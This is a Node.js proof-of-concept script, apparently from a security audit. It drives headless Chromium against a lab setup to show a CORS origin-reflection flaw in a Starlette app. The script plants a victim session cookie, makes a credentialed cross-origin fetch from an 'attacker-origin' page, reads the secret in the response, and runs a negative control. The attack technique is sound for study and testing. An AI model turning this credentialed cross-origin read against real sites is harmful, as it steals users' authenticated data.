'use strict';
// browser_exfil.js — poc_14 headless Chromium driver
//
// Drives a real headless Chromium to LIVE-OBSERVE Chain B Step 3:
//   a real browser at attacker origin https://attacker-origin:8443
//   issues fetch("https://secure-target:8443/cors-protected/whoami",{credentials:"include"})
//   and READS the victim's authenticated body cross-origin via Starlette's ACAO reflection.
//
// All human-readable diagnostics go to stderr.
// A single machine-readable JSON line prefixed with __BROWSER_RESULT__ goes to stdout.
//
// Anti-theater guarantees:
//   1. Two genuinely distinct origins (attacker-origin vs secure-target — different host).
//   2. secure-target proxy is transparent pass-through: no CORS-header synthesis.
//   3. Fetch is a bare simple GET (no custom headers, no preflight/OPTIONS).
//   4. negative_blocked is true ONLY when the in-page catch() received a TypeError
//      (negative_threw:true) — NOT on empty/short body read.
//   5. Wire-level ACAO/ACAC (`acao_seen`, `acac_true`) captured via Playwright's
//      NETWORK-LAYER observation (`page.waitForResponse` + `response.allHeaders()`),
//      which sees the actual HTTP response the browser received — NOT subject to
//      JS-readability CORS restrictions. These are CORROBORATION; the PRIMARY proof
//      is the behavioral differential (positive read succeeds + negative control throws).
//      JS-side ACAO/ACAC (`js_acao_seen`, `js_acac_true`) are always null/false by
//      CORS design (those headers are not CORS-safelisted; `resp.headers.get(...)` returns
//      null cross-origin) — emitted for transparency only; NOT load-bearing.
//   6. Same-origin authenticated-read de-risk gate: confirms secure cookie attaches
//      over self-signed TLS before the cross-origin arm runs.

const https = require('https');
const http = require('http');
const { execSync } = require('child_process');
const { chromium } = require('playwright');
const os = require('os');
const path = require('path');
const fs = require('fs');

// ── Constants ─────────────────────────────────────────────────────────────────
const VICTIM_SESSION = 'AUTOFYN_VICTIM_SESSION_b41d2e';
const EXFIL_SECRET = 'AUTOFYN_CORS_EXFIL_SECRET';
const ATTACKER_HOST = 'attacker-origin';
const SECURE_TARGET_HOST = 'secure-target';
const TLS_PORT = 8443;
const TARGET_HTTP_HOST = 'autofyn-audit-target';
const TARGET_HTTP_PORT = 8000;

const ATTACKER_ORIGIN = `https://${ATTACKER_HOST}:${TLS_PORT}`;
const SECURE_TARGET_ORIGIN = `https://${SECURE_TARGET_HOST}:${TLS_PORT}`;

// ── Generate self-signed TLS cert via openssl ────────────────────────────────
// openssl is available in the playwright:v1.49.0-noble image (Ubuntu Noble).
// This generates a fresh ephemeral RSA key + self-signed cert for this run.
function generateSelfSignedCert() {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'poc14-cert-'));
    const keyFile = path.join(tmpDir, 'key.pem');
    const certFile = path.join(tmpDir, 'cert.pem');
    try {
        execSync(
            `openssl req -x509 -nodes -newkey rsa:2048 -keyout "${keyFile}" -out "${certFile}"` +
            ` -days 1 -subj '/CN=audit-poc14' 2>/dev/null`,
            { stdio: ['ignore', 'ignore', 'pipe'] }
        );
        const key = fs.readFileSync(keyFile, 'utf8');
        const cert = fs.readFileSync(certFile, 'utf8');
        fs.rmSync(tmpDir, { recursive: true, force: true });
        return { key, cert };
    } catch (err) {
        fs.rmSync(tmpDir, { recursive: true, force: true });
        throw new Error(`openssl cert generation failed: ${err.message}`);
    }
}

// ── Proxy request: forward req to http://autofyn-audit-target:8000 ────────────
// TRANSPARENT pass-through: forwards Origin + Cookie; copies ALL response
// headers unmodified (no CORS-header synthesis). The CORS headers the browser
// sees MUST originate from Starlette's CORSMiddleware, not this proxy.
function proxyRequest(req, res) {
    const proxyOptions = {
        hostname: TARGET_HTTP_HOST,
        port: TARGET_HTTP_PORT,
        path: req.url,
        method: req.method,
        headers: {},
    };

    // Forward only safe headers — no synthesis of any CORS header
    const FORWARD_HEADERS = [
        'origin', 'cookie', 'content-type', 'accept',
        'accept-language', 'accept-encoding', 'cache-control',
    ];
    for (const h of FORWARD_HEADERS) {
        if (req.headers[h] !== undefined) {
            proxyOptions.headers[h] = req.headers[h];
        }
    }

    const proxyReq = http.request(proxyOptions, (proxyRes) => {
        // Copy ALL response headers verbatim — no modification
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        proxyRes.pipe(res, { end: true });
    });

    proxyReq.on('error', (err) => {
        console.error('[proxy] upstream error:', err.message);
        res.writeHead(502);
        res.end('Bad Gateway');
    });

    req.pipe(proxyReq, { end: true });
}

// ── Attacker page handler ─────────────────────────────────────────────────────
function serveAttackerPage(req, res) {
    const html = `<!DOCTYPE html>
<!-- AUTOFYN_BROWSER_POC14 -->
<html lang="en">
<head><meta charset="utf-8"><title>attacker page</title></head>
<body>
<script>/* Playwright evaluates code in this context */</script>
</body>
</html>`;
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end(html);
}

// ── Emit result JSON to stdout ─────────────────────────────────────────────────
function emitResult(obj) {
    process.stdout.write(`__BROWSER_RESULT__ ${JSON.stringify(obj)}\n`);
}

// ── Main ───────────────────────────────────────────────────────────────────────
async function main() {
    console.error('[init] generating self-signed TLS cert via openssl...');
    let tlsKey, tlsCert;
    try {
        ({ key: tlsKey, cert: tlsCert } = generateSelfSignedCert());
        console.error('[init] TLS cert generated OK');
    } catch (err) {
        console.error('[init] cert generation failed:', err.message);
        emitResult({
            error: `cert_generation_failed: ${err.message}`,
            positive_read: false,
            positive_body_has_secret: false,
            negative_blocked: false,
            negative_threw: false,
            acao_seen: null,
            acac_true: false,
            js_acao_seen: null,
            js_acac_true: false,
        });
        process.exit(0);
    }

    const tlsOptions = { key: tlsKey, cert: tlsCert };

    // Single HTTPS server with virtual-host routing:
    //   Host: attacker-origin  → serve attacker page
    //   Host: secure-target    → transparent proxy to http://autofyn-audit-target:8000
    // Both aliases resolve to the same container IP, so we use one listener on TLS_PORT.
    const vhostServer = https.createServer(tlsOptions, (req, res) => {
        const host = (req.headers['host'] || '').split(':')[0];
        if (host === SECURE_TARGET_HOST) {
            proxyRequest(req, res);
        } else {
            serveAttackerPage(req, res);
        }
    });

    await new Promise((resolve, reject) => {
        vhostServer.listen(TLS_PORT, '0.0.0.0', () => {
            console.error(`[vhost] HTTPS vhost server on :${TLS_PORT} (attacker-origin + secure-target proxy)`);
            resolve();
        });
        vhostServer.on('error', reject);
    });

    // ── Launch Chromium ────────────────────────────────────────────────────────
    console.error('[browser] launching Chromium...');
    const browser = await chromium.launch({
        args: [
            '--no-sandbox',
            '--disable-gpu',
            '--disable-dev-shm-usage',
            '--ignore-certificate-errors',
        ],
    });

    const context = await browser.newContext({ ignoreHTTPSErrors: true });
    const page = await context.newPage();

    let sessionPath = 'unknown';
    let sameOriginReadOk = false;

    // ── Step A: Establish session (Option A — browser navigates to login) ─────
    // The browser receives the real Set-Cookie: session=...; SameSite=None; Secure
    // from the target and stores it in its own cookie jar.
    console.error('[step-A] Option A: navigating to login to establish session...');
    let loginOk = false;
    try {
        const loginResp = await page.goto(
            `${SECURE_TARGET_ORIGIN}/cors-protected/login`,
            { waitUntil: 'load', timeout: 15000 }
        );
        const loginStatus = loginResp ? loginResp.status() : null;
        if (loginStatus === 200) {
            loginOk = true;
            sessionPath = 'login';
            console.error('[step-A] login OK (HTTP 200); cookie stored in browser jar');
        } else {
            console.error(`[step-A] login returned HTTP ${loginStatus}`);
        }
    } catch (err) {
        console.error('[step-A] login navigation failed:', err.message);
    }

    // Option B fallback: seed cookie explicitly
    if (!loginOk) {
        console.error('[step-A] falling back to Option B: seeding SameSite=None;Secure cookie');
        await context.addCookies([{
            name: 'session',
            value: VICTIM_SESSION,
            domain: SECURE_TARGET_HOST,
            path: '/',
            secure: true,
            sameSite: 'None',
            httpOnly: true,
        }]);
        sessionPath = 'seeded';
        console.error('[step-A] cookie seeded (Option B — victim session established SameSite=None;Secure)');
    }

    // ── Step B: Same-origin de-risk gate ───────────────────────────────────────
    // Confirm the Secure cookie attaches over self-signed TLS before the
    // cross-origin arm runs. A simple GET to the same target host from the
    // same context (not cross-origin) must return the secret.
    // If this fails, the Secure cookie is not attaching over self-signed TLS
    // and the cross-origin result would be meaningless — abort to §9 fallback.
    console.error('[step-B] same-origin de-risk gate: verifying cookie attaches over self-signed TLS...');
    let sameOriginBody = '';
    try {
        // Navigate to a same-"origin" page (secure-target) then do same-origin fetch
        if (sessionPath !== 'login') {
            // If we didn't navigate to login, navigate to the secure-target base to
            // establish a context on that origin before the same-origin fetch check
            await page.goto(`${SECURE_TARGET_ORIGIN}/cors-protected/login`, {
                waitUntil: 'load',
                timeout: 15000,
            }).catch(() => { /* ignore nav errors; cookie seeded */ });
        }
        sameOriginBody = await page.evaluate(async (url) => {
            try {
                const r = await fetch(url, { credentials: 'include' });
                return r.text();
            } catch (e) {
                return `ERROR: ${e.message}`;
            }
        }, `${SECURE_TARGET_ORIGIN}/cors-protected/whoami`);
        sameOriginReadOk = sameOriginBody.includes(EXFIL_SECRET);
        console.error(`[step-B] same-origin read body: ${sameOriginBody.slice(0, 120)}`);
        console.error(`[step-B] gate: ${sameOriginReadOk ? 'PASSED (secret present)' : 'FAILED (secret absent)'}`);
    } catch (err) {
        console.error('[step-B] same-origin read threw:', err.message);
        sameOriginReadOk = false;
    }

    if (!sameOriginReadOk) {
        console.error('[step-B] ABORT: cookie did not attach over self-signed TLS; cross-origin result meaningless.');
        await browser.close();
        vhostServer.close();
        emitResult({
            error: 'same_origin_gate_failed',
            session_path: sessionPath,
            positive_read: false,
            positive_body_has_secret: false,
            negative_blocked: false,
            negative_threw: false,
            acao_seen: null,
            acac_true: false,
            js_acao_seen: null,
            js_acac_true: false,
        });
        process.exit(0);
    }

    // ── Step C: Navigate to attacker page (cross-origin context) ─────────────
    console.error('[step-C] navigating to attacker page...');
    await page.goto(`${ATTACKER_ORIGIN}/attacker.html`, { waitUntil: 'load', timeout: 15000 });
    const currentOrigin = await page.evaluate(() => window.location.origin);
    console.error(`[step-C] current page origin: ${currentOrigin}`);

    // ── Step D: Positive — cross-origin credentialed fetch with wire header capture ─
    // BARE SIMPLE GET: credentials:include, no custom headers, no Content-Type
    // override. A simple GET triggers NO OPTIONS preflight — the proxy only
    // needs to relay the GET (no OPTIONS handling required).
    //
    // Wire-level ACAO/ACAC: captured via page.waitForResponse started concurrently
    // with the in-page fetch. waitForResponse is scoped to AFTER navigation to the
    // attacker page (Step C), so it captures the Step-D cross-origin response, NOT
    // the Step-B same-origin one (which was issued earlier from a different page origin).
    // Filter: URL matches whoami AND the response frame is the attacker-origin page.
    //
    // JS-side acao/acac (resp.headers.get(...)) are always null by CORS design —
    // those headers are not CORS-safelisted; cross-origin JS cannot read them.
    // Emitted as js_acao_seen / js_acac_true (informational only, not load-bearing).
    console.error('[step-D] cross-origin credentialed fetch (positive) — wire capture via waitForResponse...');
    console.error('[step-D] NOTE: JS-side ACAO/ACAC will be null by CORS design (not a failure).');

    const WHOAMI_URL_JS = `${SECURE_TARGET_ORIGIN}/cors-protected/whoami`;

    // Wire-level vars populated by waitForResponse
    let wireAcao = null;
    let wireAcac = false;

    // Start waitForResponse BEFORE the evaluate so it does not miss the response.
    // Filter: URL is whoami AND the request's frame is the attacker-origin page
    // (guarantees we capture Step-D cross-origin, not Step-B same-origin).
    const attacker_origin_prefix = ATTACKER_ORIGIN;
    const wireResponsePromise = page.waitForResponse(
        async (resp) => {
            if (resp.url() !== WHOAMI_URL_JS) return false;
            // Confirm the request came from the attacker-origin frame (cross-origin step D),
            // not from the secure-target frame (same-origin step B).
            try {
                const frame = resp.frame();
                const frameUrl = frame ? frame.url() : '';
                return frameUrl.startsWith(attacker_origin_prefix);
            } catch (_) {
                return false;
            }
        },
        { timeout: 15000 }
    ).then(async (resp) => {
        try {
            const headers = await resp.allHeaders();
            wireAcao = headers['access-control-allow-origin'] || null;
            wireAcac = headers['access-control-allow-credentials'] === 'true';
            console.error(`[step-D] wire ACAO: ${wireAcao}  wire ACAC: ${wireAcac}`);
        } catch (err) {
            console.error('[step-D] wire allHeaders() threw (response gone?):', err.message);
            // Leave wireAcao null / wireAcac false — handled in verdict
        }
    }).catch((err) => {
        console.error('[step-D] waitForResponse timed out or failed:', err.message);
        // Leave wireAcao null / wireAcac false — handled in verdict
    });

    const positiveResult = await page.evaluate(async (targetUrl) => {
        let status = null;
        let body = '';
        let jsAcao = null;
        let jsAcac = null;
        let threw = false;
        let errMsg = null;
        try {
            // Bare simple GET — no custom headers — no preflight
            const resp = await fetch(targetUrl, { credentials: 'include' });
            status = resp.status;
            // JS-side CORS header read — will be null by design (not a failure).
            // These headers are not CORS-safelisted; cross-origin JS cannot read them.
            jsAcao = resp.headers.get('access-control-allow-origin');
            jsAcac = resp.headers.get('access-control-allow-credentials');
            body = await resp.text();
        } catch (e) {
            threw = true;
            errMsg = e.message || String(e);
        }
        return { status, body, jsAcao, jsAcac, threw, errMsg };
    }, WHOAMI_URL_JS);

    // Wait for the wire capture to settle (it was started before evaluate)
    await wireResponsePromise;

    console.error('[step-D] positive result:', JSON.stringify(positiveResult));
    console.error('[step-D] js_acao_seen (null by CORS design, informational only):', positiveResult.jsAcao);
    console.error('[step-D] js_acac_true (false by CORS design, informational only):', positiveResult.jsAcac === 'true');

    const positiveRead = !positiveResult.threw && positiveResult.status === 200;
    const positiveBodyHasSecret = positiveResult.body.includes(EXFIL_SECRET);
    // Wire-observed ACAO/ACAC (from Playwright network layer — the real proof):
    const acaoSeen = wireAcao;
    const acacTrue = wireAcac;
    // JS-side ACAO/ACAC (informational only — always null/false by CORS design):
    const jsAcaoSeen = positiveResult.jsAcao || null;
    const jsAcacTrue = positiveResult.jsAcac === 'true';

    // ── Step E: Negative — cross-origin fetch against non-CORS endpoint ────────
    // /no-cors-here is structurally identical to /whoami (same session-cookie gate,
    // same _VICTIM_SESSION constant, 401 without cookie, 200+marker with cookie)
    // BUT served by _fastapi_app with NO CORSMiddleware. The browser SOP MUST block
    // the read. We require a THROWN TypeError (negative_threw:true) — NOT an empty
    // body, which could mean the proxy stripped the body silently.
    console.error('[step-E] cross-origin credentialed fetch (negative control)...');
    const negativeResult = await page.evaluate(async (targetUrl) => {
        let threw = false;
        let isTypeError = false;
        let errMsg = '';
        let resolvedOk = false;
        let body = '';
        try {
            const resp = await fetch(targetUrl, { credentials: 'include' });
            resolvedOk = true;
            body = await resp.text();
        } catch (e) {
            threw = true;
            isTypeError = (e instanceof TypeError) || e.name === 'TypeError';
            errMsg = e.message || String(e);
        }
        return { threw, isTypeError, errMsg, resolvedOk, body };
    }, `${SECURE_TARGET_ORIGIN}/no-cors-here`);

    console.error('[step-E] negative result:', JSON.stringify(negativeResult));

    // negative_blocked gates ONLY on a thrown TypeError — not empty/short body
    const negativeThrew = negativeResult.threw && negativeResult.isTypeError;
    const negativeBlocked = negativeThrew;

    await browser.close();
    vhostServer.close();

    // ── Emit machine-readable result ──────────────────────────────────────────
    const result = {
        session_path: sessionPath,
        same_origin_gate_ok: sameOriginReadOk,
        positive_read: positiveRead,
        positive_body_has_secret: positiveBodyHasSecret,
        acao_seen: acaoSeen,        // WIRE (Playwright allHeaders) — corroboration
        acac_true: acacTrue,         // WIRE — corroboration
        js_acao_seen: jsAcaoSeen,    // null by CORS design — informational only
        js_acac_true: jsAcacTrue,    // false by CORS design — informational only
        negative_blocked: negativeBlocked,
        negative_threw: negativeThrew,
    };

    emitResult(result);
    console.error('[done] result emitted:', JSON.stringify(result));
    process.exit(0);
}

main().catch((err) => {
    console.error('[fatal]', err);
    emitResult({
        error: String(err),
        session_path: 'unknown',
        positive_read: false,
        positive_body_has_secret: false,
        negative_blocked: false,
        negative_threw: false,
        acao_seen: null,
        acac_true: false,
        js_acao_seen: null,
        js_acac_true: false,
    });
    process.exit(1);
});
